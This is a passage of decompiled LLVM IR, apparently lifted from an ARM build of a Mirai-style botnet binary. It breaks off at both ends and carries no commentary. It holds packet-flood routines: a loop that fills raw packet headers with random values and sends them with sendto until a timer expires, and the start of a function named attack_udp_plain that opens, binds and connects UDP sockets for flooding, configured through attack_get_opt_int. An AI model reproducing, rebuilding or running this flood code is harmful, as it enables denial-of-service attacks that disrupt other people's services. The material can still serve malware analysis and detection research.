  %v3_c838 = mul i32 %v3_c834, 32
  store i32 %v3_c838, i32* %lr.global-to-local, align 4
  %v3_c83c = load i32, i32* @r6, align 4
  %v4_c83c = add i32 %v3_c83c, 16
  %v5_c83c = inttoptr i32 %v4_c83c to i16*
  store i16 %v5_c830, i16* %v5_c83c, align 2
  %v0_c840 = load i32, i32* %lr.global-to-local, align 4
  %v1_c840 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_c840, -8
  %v5_c840 = add i32 %v0_c840, %tmp70
  store i32 %v5_c840, i32* %lr.global-to-local, align 4
  %v0_c844 = load i32, i32* @r6, align 4
  %v1_c844 = add i32 %v0_c844, 2
  %v2_c844 = inttoptr i32 %v1_c844 to i16*
  %v3_c844 = load i16, i16* %v2_c844, align 2
  %v4_c844 = zext i16 %v3_c844 to i32
  store i32 %v4_c844, i32* @r6, align 4
  %v1_c848 = load i32, i32* @r7, align 4
  %v2_c848 = add i32 %v1_c848, %v5_c840
  store i32 %v2_c848, i32* @lr, align 4
  %v3_c84c = add i32 %v2_c848, 2
  %v4_c84c = inttoptr i32 %v3_c84c to i16*
  store i16 %v3_c844, i16* %v4_c84c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c858 = load i32, i32* @r5, align 4
  store i32 %v0_c858, i32* %r1.global-to-local, align 4
  %v0_c85c = load i32, i32* @r8, align 4
  store i32 %v0_c85c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c864 = load i32, i32* @lr, align 4
  %v6_c86c = call i32 @__libc_sendto(i32 %v0_c85c, i32 %v0_c858, i32 60, i32 16384, i32 %v0_c864, i32 16)
  %v3_c870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c870, i32* %r3.global-to-local, align 4
  %v1_c874 = add i32 %v3_c870, 1
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  %v1_c878 = load i32, i32* @sb, align 4
  %v9_c878 = icmp eq i32 %v1_c874, %v1_c878
  store i1 %v9_c878, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c874, i32* %stack_var_-44, align 4
  %v6_c880 = icmp slt i32 %v1_c874, %v1_c878
  br i1 %v6_c880, label %dec_label_pc_c884, label %dec_label_pc_c98c

dec_label_pc_c884:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c7a0
  %v1_c894 = phi i32 [ %v1_c874, %dec_label_pc_c800 ], [ 0, %dec_label_pc_c7a0 ]
  %v5_c888 = mul i32 %v1_c894, 24
  %v1_c88c = load i32, i32* @r7, align 4
  %v2_c88c = add i32 %v1_c88c, %v5_c888
  store i32 %v2_c88c, i32* %r3.global-to-local, align 4
  %v1_c890 = add i32 %v2_c88c, 20
  %v2_c890 = inttoptr i32 %v1_c890 to i8*
  %v3_c890 = load i8, i8* %v2_c890, align 1
  %v4_c890 = zext i8 %v3_c890 to i32
  store i32 %v4_c890, i32* %r2.global-to-local, align 4
  %v0_c894 = load i32, i32* @sl, align 4
  %v4_c894 = mul i32 %v1_c894, 4
  %v5_c894 = add i32 %v0_c894, %v4_c894
  %v6_c894 = inttoptr i32 %v5_c894 to i32*
  %v7_c894 = load i32, i32* %v6_c894, align 4
  store i32 %v7_c894, i32* @r5, align 4
  %v2_c898 = icmp ugt i8 %v3_c890, 30
  %v7_c898 = icmp eq i8 %v3_c890, 31
  store i1 %v7_c898, i1* %cpsr_z.global-to-local, align 1
  %v1_c89c = add i32 %v7_c894, 20
  store i32 %v1_c89c, i32* @r6, align 4
  %v2_c8a0 = xor i1 %v7_c898, true
  %v3_c8a0 = and i1 %v2_c898, %v2_c8a0
  br i1 %v3_c8a0, label %dec_label_pc_c7a8, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c884
  %v1_c8a4 = add i32 %v2_c88c, 16
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  %v3_c8a4 = load i32, i32* %v2_c8a4, align 4
  store i32 %v3_c8a4, i32* %r4.global-to-local, align 4
  %v0_c8a8 = call i32 @rand_next()
  store i32 %v0_c8a8, i32* %r0.global-to-local, align 4
  %v3_c8ac = load i32, i32* %stack_var_-44, align 4
  %v5_c8b4 = mul i32 %v3_c8ac, 24
  %v0_c8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c8b8 = and i32 %v0_c8b8, 16711680
  %v3_c8bc = udiv i32 %v0_c8b8, 16777216
  %v4_c8c0 = udiv i32 %v1_c8b8, 256
  %v5_c8c0 = or i32 %v4_c8c0, %v3_c8bc
  store i32 %v5_c8c0, i32* %r2.global-to-local, align 4
  %v1_c8c4 = load i32, i32* @r7, align 4
  %v2_c8c4 = add i32 %v1_c8c4, %v5_c8b4
  store i32 %v2_c8c4, i32* %r1.global-to-local, align 4
  %v1_c8c8 = and i32 %v0_c8b8, 65280
  store i32 %v1_c8c8, i32* %r3.global-to-local, align 4
  %v1_c8cc = add i32 %v2_c8c4, 20
  %v2_c8cc = inttoptr i32 %v1_c8cc to i8*
  %v3_c8cc = load i8, i8* %v2_c8cc, align 1
  %v4_c8cc = zext i8 %v3_c8cc to i32
  %v5_c8d4 = call i32 @llvm.bswap.i32(i32 %v0_c8b8)
  %v7_c8d8 = lshr i32 %v0_c8a8, %v4_c8cc
  %v8_c8d8 = add i32 %v7_c8d8, %v5_c8d4
  store i32 %v8_c8d8, i32* %r2.global-to-local, align 4
  %v1_c8dc = and i32 %v8_c8d8, 16711680
  store i32 %v1_c8dc, i32* %r0.global-to-local, align 4
  %v1_c8e8 = and i32 %v8_c8d8, 65280
  store i32 %v1_c8e8, i32* %r1.global-to-local, align 4
  %v5_c8f0 = call i32 @llvm.bswap.i32(i32 %v8_c8d8)
  %v1_c8f4 = load i32, i32* @r5, align 4
  %v2_c8f4 = add i32 %v1_c8f4, 16
  %v3_c8f4 = inttoptr i32 %v2_c8f4 to i32*
  store i32 %v5_c8f0, i32* %v3_c8f4, align 4
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  %v0_c904 = call i32 @rand_next()
  %v1_c90c = load i32, i32* @r5, align 4
  %v2_c90c = add i32 %v1_c90c, 12
  %v3_c90c = inttoptr i32 %v2_c90c to i32*
  store i32 %v0_c904, i32* %v3_c90c, align 4
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_c918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c918, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c920:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v0_c920 = call i32 @rand_next()
  %v1_c920 = trunc i32 %v0_c920 to i16
  store i32 %v0_c920, i32* %r0.global-to-local, align 4
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v1_c928 = load i32, i32* @r4, align 4
  %v9_c928 = icmp eq i32 %v3_c524, %v1_c928
  store i1 %v9_c928, i1* %cpsr_z.global-to-local, align 1
  %v3_c92c = load i32, i32* @r5, align 4
  %v4_c92c = add i32 %v3_c92c, 4
  %v5_c92c = inttoptr i32 %v4_c92c to i16*
  store i16 %v1_c920, i16* %v5_c92c, align 2
  br i1 %v9_c928, label %dec_label_pc_c934, label %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge

dec_label_pc_c920.dec_label_pc_c7d4_crit_edge:    ; preds = %dec_label_pc_c920
  %v1_c7d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7d4

dec_label_pc_c934:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c7c8
  %v0_c934 = call i32 @rand_next()
  %v1_c934 = trunc i32 %v0_c934 to i16
  store i32 %v0_c934, i32* %r0.global-to-local, align 4
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v1_c93c = load i32, i32* @r4, align 4
  %v9_c93c = icmp eq i32 %v3_c528, %v1_c93c
  store i1 %v9_c93c, i1* %cpsr_z.global-to-local, align 1
  %v3_c940 = load i32, i32* @r5, align 4
  %v4_c940 = add i32 %v3_c940, 20
  %v5_c940 = inttoptr i32 %v4_c940 to i16*
  store i16 %v1_c934, i16* %v5_c940, align 2
  br i1 %v9_c93c, label %dec_label_pc_c948, label %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge

dec_label_pc_c934.dec_label_pc_c7e0_crit_edge:    ; preds = %dec_label_pc_c934
  %v1_c7e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7e0

dec_label_pc_c948:                                ; preds = %dec_label_pc_c934, %dec_label_pc_c7d4
  %v0_c948 = call i32 @rand_next()
  %v1_c948 = trunc i32 %v0_c948 to i16
  store i32 %v0_c948, i32* %r0.global-to-local, align 4
  store i32 %v6_c3e0, i32* %r3.global-to-local, align 4
  %v1_c950 = load i32, i32* @r4, align 4
  %v9_c950 = icmp eq i32 %v6_c3e0, %v1_c950
  store i1 %v9_c950, i1* %cpsr_z.global-to-local, align 1
  %v3_c954 = load i32, i32* @r6, align 4
  %v4_c954 = add i32 %v3_c954, 2
  %v5_c954 = inttoptr i32 %v4_c954 to i16*
  store i16 %v1_c948, i16* %v5_c954, align 2
  br i1 %v9_c950, label %dec_label_pc_c95c, label %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge

dec_label_pc_c948.dec_label_pc_c7ec_crit_edge:    ; preds = %dec_label_pc_c948
  %v1_c7f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7ec

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c948, %dec_label_pc_c7e0
  %v0_c95c = call i32 @rand_next()
  %v1_c960 = load i32, i32* @r6, align 4
  %v2_c960 = add i32 %v1_c960, 4
  %v3_c960 = inttoptr i32 %v2_c960 to i32*
  store i32 %v0_c95c, i32* %v3_c960, align 4
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v1_c968 = load i32, i32* @r4, align 4
  %v9_c968 = icmp eq i32 %v6_c3f8, %v1_c968
  store i1 %v9_c968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c968, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c970:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c970 = call i32 @rand_next()
  store i32 %v0_c970, i32* %r0.global-to-local, align 4
  %v0_c974 = load i32, i32* @fp, align 4
  %v2_c974 = icmp eq i32 %v0_c974, 0
  store i1 %v2_c974, i1* %cpsr_z.global-to-local, align 1
  %v1_c978 = load i32, i32* @r6, align 4
  %v2_c978 = add i32 %v1_c978, 8
  %v3_c978 = inttoptr i32 %v2_c978 to i32*
  store i32 %v0_c970, i32* %v3_c978, align 4
  br i1 %v2_c974, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970
  %v0_c980 = call i32 @rand_next()
  %v1_c980 = trunc i32 %v0_c980 to i16
  store i32 %v0_c980, i32* %r0.global-to-local, align 4
  %v3_c984 = load i32, i32* @r6, align 4
  %v4_c984 = add i32 %v3_c984, 18
  %v5_c984 = inttoptr i32 %v4_c984 to i16*
  store i16 %v1_c980, i16* %v5_c984, align 2
  br label %dec_label_pc_c800

dec_label_pc_c98c:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c990 = call i32 @__GI_time(i32* null)
  store i32 %v2_c990, i32* %r0.global-to-local, align 4
  store i32 %v2_c4b4, i32* %r3.global-to-local, align 4
  %v9_c998 = icmp eq i32 %v2_c4b4, %v2_c990
  store i1 %v9_c998, i1* %cpsr_z.global-to-local, align 1
  %v6_c99c = icmp slt i32 %v2_c4b4, %v2_c990
  br i1 %v6_c99c, label %dec_label_pc_c9a0, label %dec_label_pc_c98c.dec_label_pc_c790_crit_edge

dec_label_pc_c98c.dec_label_pc_c790_crit_edge:    ; preds = %dec_label_pc_c98c
  %v0_c794.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c790

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c98c, %entry, %dec_label_pc_c9ac
  %v1_c9a8 = phi i32 [ %v3_c4c8, %entry ], [ %v1_c9b0, %dec_label_pc_c9ac ], [ %v2_c990, %dec_label_pc_c98c ]
  store i32 %v3_c2e4, i32* %r4.global-to-local, align 4
  store i32 %v24_c2e4, i32* %fp.global-to-local, align 4
  store i32 %v27_c2e4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c9a8

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c4d8
  %v0_c9ac = load i32, i32* @r8, align 4
  store i32 %v0_c9ac, i32* %r0.global-to-local, align 4
  %v1_c9b0 = call i32 @__GI___libc_close(i32 %v0_c9ac)
  store i32 %v1_c9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9a0

; uselistorder directives
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v0_c980, { 1, 0 }
  uselistorder i32 %v0_c948, { 1, 0 }
  uselistorder i32 %v0_c934, { 1, 0 }
  uselistorder i32 %v0_c920, { 1, 0 }
  uselistorder i32 %v0_c8b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c874, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c840, { 1, 0 }
  uselistorder i32 %v4_c830, { 1, 0 }
  uselistorder i1 %v9_c918, { 2, 3, 1, 0 }
  uselistorder i1 %v7_c7ac, { 2, 1, 0 }
  uselistorder i32 %v2_c780, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c5e8, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 1, 0 }
  uselistorder i32 %v1_c5a8, { 2, 0, 1 }
  uselistorder i32 %v1_c5a4, { 2, 0, 1 }
  uselistorder i32 %v1_c5a0, { 2, 0, 1 }
  uselistorder i32 %v1_c59c, { 2, 0, 1 }
  uselistorder i32 %v3_c524, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v3_c520, { 1, 2, 0, 3 }
  uselistorder i32 %v0_c514, { 1, 0, 2 }
  uselistorder i1 %v7_c4f8, { 1, 0 }
  uselistorder i1 %v7_c4cc, { 1, 0 }
  uselistorder i32 %v3_c4c8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_c4b4, { 2, 1, 0 }
  uselistorder i32 %v6_c4a4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_c3f8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_c3e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c364, { 1, 0 }
  uselistorder i32 %v8_c34c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 8, 10, 11, 9, 12, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 36, 33, 34, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 57, { 6, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 58, { 6, 7, 8, 9, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 45, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_c9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
  uselistorder label %dec_label_pc_c800, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_c9e0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c9ec = load i32, i32* @fp, align 4
  store i32 %v0_c9ec, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @calloc(i32 %v0_c9ec, i32 4)
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r6, align 4
  %v0_c9fc = load i32, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_c9f0, i32* @sb, align 4
  %v0_ca0c = load i32, i32* @r4, align 4
  store i32 %v0_ca0c, i32* %r0.global-to-local, align 4
  %v5_ca10 = inttoptr i32 %v0_c9fc to i32*
  %v6_ca10 = call i32 @attack_get_opt_int(i32 %v0_ca0c, i32* %v5_ca10, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_ca14 = load i32, i32* @r5, align 4
  %v0_ca20 = load i32, i32* @r6, align 4
  store i32 %v0_ca20, i32* %r3.global-to-local, align 4
  %v0_ca24 = load i32, i32* @r4, align 4
  store i32 %v0_ca24, i32* %r0.global-to-local, align 4
  %v3_ca28 = urem i32 %v6_ca10, 65536
  store i32 %v3_ca28, i32* @r8, align 4
  %v5_ca2c = inttoptr i32 %v0_ca14 to i32*
  %v6_ca2c = call i32 @attack_get_opt_int(i32 %v0_ca24, i32* %v5_ca2c, i32 6, i32 %v0_ca20)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v3_ca34 = mul i32 %v6_ca2c, 65536
  store i32 %v3_ca34, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ca40 = load i32, i32* @r4, align 4
  store i32 %v0_ca40, i32* %r0.global-to-local, align 4
  %v4_ca44 = inttoptr i32 %v0_ca30 to i32*
  %v5_ca44 = call i32 @attack_get_opt_int(i32 %v0_ca40, i32* %v4_ca44, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ca54 = urem i32 %v5_ca44, 65536
  %v0_ca58 = load i32, i32* @r5, align 4
  %v0_ca5c = load i32, i32* @r4, align 4
  store i32 %v0_ca5c, i32* %r0.global-to-local, align 4
  %v4_ca64 = inttoptr i32 %v0_ca58 to i32*
  %v5_ca64 = call i32 @attack_get_opt_int(i32 %v0_ca5c, i32* %v4_ca64, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca70 = urem i32 %v5_ca64, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_ca8c = call i32 @__GI_time(i32* null)
  store i32 %v2_ca8c, i32* %r0.global-to-local, align 4
  %v0_ca90 = load i32, i32* @sl, align 4
  %v3_ca90 = udiv i32 %v0_ca90, 65536
  %v1_ca94 = load i32, i32* @r6, align 4
  %v9_ca94 = icmp eq i32 %v3_ca90, %v1_ca94
  br i1 %v9_ca94, label %dec_label_pc_cc68, label %bb

bb:                                               ; preds = %entry
  %v4_ca9c = udiv i32 %v0_ca90, 16777216
  store i32 %v4_ca9c, i32* %r3.global-to-local, align 4
  %v1_caa0 = load i32, i32* @r7, align 4
  %v2_caa0 = add i32 %v1_caa0, %v2_ca8c
  store i32 %v2_caa0, i32* %r0.global-to-local, align 4
  %v2_ca98 = mul nuw nsw i32 %v3_ca90, 256
  %v6_caa4 = or i32 %v2_ca98, %v4_ca9c
  %extract.t58 = trunc i32 %v6_caa4 to i16
  br label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %bb, %dec_label_pc_cc68
  %v6_caa4.sink.off0 = phi i16 [ %extract.t58, %bb ], [ %extract.t59, %dec_label_pc_cc68 ]
  %v0_caa810 = phi i32 [ %v2_caa0, %bb ], [ %v2_caa013, %dec_label_pc_cc68 ]
  %v0_cab4 = load i32, i32* @fp, align 4
  %v2_cab4 = icmp eq i32 %v0_cab4, 0
  br i1 %v2_cab4, label %dec_label_pc_cbec, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_cab4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_cae8 = ptrtoint i32* %stack_var_-56 to i32
  %v4_cb08 = sext i16 %v6_caa4.sink.off0 to i32
  br label %dec_label_pc_cb3c

dec_label_pc_cacc:                                ; preds = %.thread26, %dec_label_pc_cb78
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cad8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_cad8, i32* %r0.global-to-local, align 4
  %v7_cadc = icmp eq i32 %v3_cad8, -1
  %v0_cae0 = load i32, i32* @sl, align 4
  %v1_cae0 = add i32 %v0_cae0, 1
  store i32 %v1_cae0, i32* @sl, align 4
  %v0_cae4 = load i32, i32* @r7, align 4
  %v1_cae4 = add i32 %v0_cae4, 24
  store i32 %v1_cae4, i32* @r7, align 4
  %v1_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = load i32, i32* @sb, align 4
  %v3_caf0 = add i32 %v2_caf0, %v1_caf0
  %v4_caf0 = inttoptr i32 %v3_caf0 to i32*
  store i32 %v3_cad8, i32* %v4_caf0, align 4
  br i1 %v7_cadc, label %dec_label_pc_cc10.loopexit14, label %dec_label_pc_caf8

dec_label_pc_caf8:                                ; preds = %dec_label_pc_cacc
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_cb08, i32* %r3.global-to-local, align 4
  %v0_cb10 = load i32, i32* %r0.global-to-local, align 4
  %v3_cb10 = call i32 @bind(i32 %v0_cb10, i32 %v2_cae8, i32 16)
  store i32 %v3_cb10, i32* %r0.global-to-local, align 4
  %v0_cb14 = load i32, i32* @r5, align 4
  %v1_cb14 = add i32 %v0_cb14, 20
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v4_cb14 = zext i8 %v3_cb14 to i32
  store i32 %v4_cb14, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cb14, 32
  br i1 %tmp, label %dec_label_pc_cb8c, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_caf8
  %v0_cb20 = load i32, i32* @r6, align 4
  %v1_cb20 = load i32, i32* @sb, align 4
  %v2_cb20 = add i32 %v1_cb20, %v0_cb20
  %v3_cb20 = inttoptr i32 %v2_cb20 to i32*
  %v4_cb20 = load i32, i32* %v3_cb20, align 4
  store i32 %v4_cb20, i32* %r0.global-to-local, align 4
  %v3_cb2c = call i32 @__libc_connect(i32 %v4_cb20, i32 %v0_cb14, i32 16)
  store i32 %v3_cb2c, i32* %r0.global-to-local, align 4
  %v0_cb30 = load i32, i32* @sl, align 4
  %v1_cb30 = load i32, i32* @fp, align 4
  %v9_cb30 = icmp eq i32 %v0_cb30, %v1_cb30
  %v0_cb34 = load i32, i32* @r6, align 4
  %v1_cb34 = add i32 %v0_cb34, 4
  store i32 %v1_cb34, i32* @r6, align 4
  br i1 %v9_cb30, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cabc
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r0.global-to-local, align 4
  %v3_cb4c = call i32 @calloc(i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32 1)
  store i32 %v3_cb4c, i32* %r0.global-to-local, align 4
  %v0_cb50 = load i32, i32* @r8, align 4
  %v3_cb54 = udiv i32 %v0_cb50, 256
  %v1_cb50 = mul i32 %v0_cb50, 256
  %v4_cb58 = and i32 %v1_cb50, 65280
  %v5_cb58 = or i32 %v4_cb58, %v3_cb54
  store i32 %v5_cb58, i32* %r3.global-to-local, align 4
  %v2_cb5c = load i32, i32* %stack_var_-80, align 4
  %v1_cb60 = load i32, i32* @r7, align 4
  %v2_cb60 = add i32 %v1_cb60, %v2_cb5c
  store i32 %v2_cb60, i32* @r5, align 4
  %v1_cb68 = load i32, i32* @r4, align 4
  %v9_cb68 = icmp eq i32 %v0_cb50, %v1_cb68
  %v1_cb6c = load i32, i32* @r6, align 4
  %v3_cb6c = add i32 %v1_cb6c, %v2_c9e0
  %v4_cb6c = inttoptr i32 %v3_cb6c to i32*
  store i32 %v3_cb4c, i32* %v4_cb6c, align 4
  br i1 %v9_cb68, label %dec_label_pc_cb78, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_cb3c
  %v1_cb7027 = load i32, i32* %r3.global-to-local, align 4
  %v2_cb7028 = trunc i32 %v1_cb7027 to i16
  %v3_cb7029 = load i32, i32* @r5, align 4
  %v4_cb7030 = add i32 %v3_cb7029, 2
  %v5_cb7031 = inttoptr i32 %v4_cb7030 to i16*
  store i16 %v2_cb7028, i16* %v5_cb7031, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb3c
  %v0_cb78 = call i32 @rand_next()
  %v1_cb78 = trunc i32 %v0_cb78 to i16
  store i32 %v0_cb78, i32* %r0.global-to-local, align 4
  %v2_cb7c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_cb7c, i32* %r3.global-to-local, align 4
  %v1_cb80 = load i32, i32* @r7, align 4
  %v2_cb80 = add i32 %v1_cb80, %v2_cb7c
  store i32 %v2_cb80, i32* @r5, align 4
  %v4_cb84 = add i32 %v2_cb80, 2
  %v5_cb84 = inttoptr i32 %v4_cb84 to i16*
  store i16 %v1_cb78, i16* %v5_cb84, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_caf8
  %v1_cb8c = add i32 %v0_cb14, 16
  %v2_cb8c = inttoptr i32 %v1_cb8c to i32*
  %v3_cb8c = load i32, i32* %v2_cb8c, align 4
  store i32 %v3_cb8c, i32* @r4, align 4
  %v0_cb90 = call i32 @rand_next()
  store i32 %v0_cb90, i32* %r0.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r4, align 4
  %v1_cba0 = and i32 %v0_cb94, 65280
  store i32 %v1_cba0, i32* %r3.global-to-local, align 4
  %v0_cba4 = load i32, i32* @r5, align 4
  %v1_cba4 = add i32 %v0_cba4, 20
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v4_cba4 = zext i8 %v3_cba4 to i32
  %v5_cbac = call i32 @llvm.bswap.i32(i32 %v0_cb94)
  %v7_cbb0 = lshr i32 %v0_cb90, %v4_cba4
  %v8_cbb0 = add i32 %v7_cbb0, %v5_cbac
  %v1_cbb4 = and i32 %v8_cbb0, 16711680
  store i32 %v1_cbb4, i32* %r0.global-to-local, align 4
  %v5_cbc8 = call i32 @llvm.bswap.i32(i32 %v8_cbb0)
  store i32 %v5_cbc8, i32* %r3.global-to-local, align 4
  %v2_cbcc = add i32 %v0_cba4, 4
  %v3_cbcc = inttoptr i32 %v2_cbcc to i32*
  store i32 %v5_cbc8, i32* %v3_cbcc, align 4
  %v0_cbd0 = load i32, i32* @r5, align 4
  %v0_cbd4 = load i32, i32* @r6, align 4
  %v1_cbd4 = load i32, i32* @sb, align 4
  %v2_cbd4 = add i32 %v1_cbd4, %v0_cbd4
  %v3_cbd4 = inttoptr i32 %v2_cbd4 to i32*
  %v4_cbd4 = load i32, i32* %v3_cbd4, align 4
  store i32 %v4_cbd4, i32* %r0.global-to-local, align 4
  %v3_cbdc = call i32 @__libc_connect(i32 %v4_cbd4, i32 %v0_cbd0, i32 16)
  store i32 %v3_cbdc, i32* %r0.global-to-local, align 4
  %v0_cbe0 = load i32, i32* @sl, align 4
  %v1_cbe0 = load i32, i32* @fp, align 4
